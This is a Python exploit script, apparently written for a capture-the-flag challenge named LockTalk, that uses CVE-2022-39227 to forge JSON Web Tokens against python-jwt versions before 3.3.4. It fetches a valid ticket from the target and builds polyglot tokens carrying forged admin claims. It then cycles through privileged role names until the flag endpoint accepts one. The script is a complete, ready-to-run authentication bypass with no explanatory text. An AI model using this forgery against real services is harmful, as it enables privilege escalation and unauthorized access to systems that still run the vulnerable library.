{"content": "#!/usr/bin/env python3
"""CVE-2022-39227 polyglot JWT forgery against python-jwt < 3.3.4."""
import base64, json, sys, time, urllib.request, urllib.error

sys.path.insert(0, '/workspace/loot')

BASE = 'http://locktalk:1337'

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def b64u_dec(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())

def jwt_from_ticket(ticket):
    return ticket

def forge(orig_token, forged_claims):
    header, payload, signature = orig_token.split('.')
    fake_payload = b64u(json.dumps(forged_claims, separators=(',', ':')).encode())
    # NOTE: '{"  ' is exactly 4 chars so base64 decoding stays aligned
    return ('{"  ' + header + '.' + fake_payload + '.'
            '":"","protected":"' + header + '", "payload":"' + payload +
            '","signature":"' + signature + '"}')

def req(path, token, base=BASE):
    r = urllib.request.Request(base + path, headers={'Authorization': token})
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)

def get_ticket(base=BASE, path='//api/v1/get_ticket'):
    r = urllib.request.Request(base + path)
    with urllib.request.urlopen(r, timeout=10) as resp:
        data = json.loads(resp.read().decode())
    return data['ticket: ']

if __name__ == '__main__':
    base = BASE
    if len(sys.argv) > 1:
        base = sys.argv[1]
    orig = get_ticket(base)
    h, p, s = orig.split('.')
    print('orig header:', b64u_dec(h))
    print('orig claims:', b64u_dec(p))
    now = int(time.time())
    roles = ['administrator', 'admin', 'superadmin', 'admin_user', 'root', 'privileged', 'staff', 'user', 'guest']
    for role in roles:
        claims = {'exp': now + 3600, 'iat': now, 'nbf': now, 'role': role, 'user': 'admin'}
        tok = forge(orig, claims)
        st, body = req('/api/v1/flag', tok, base)
        print('role=%-14s status=%s body=%s' % (role, st, body[:200].replace('\n', ' ')))
        if st == 200:
            print('SUCCESS with', role)
            break
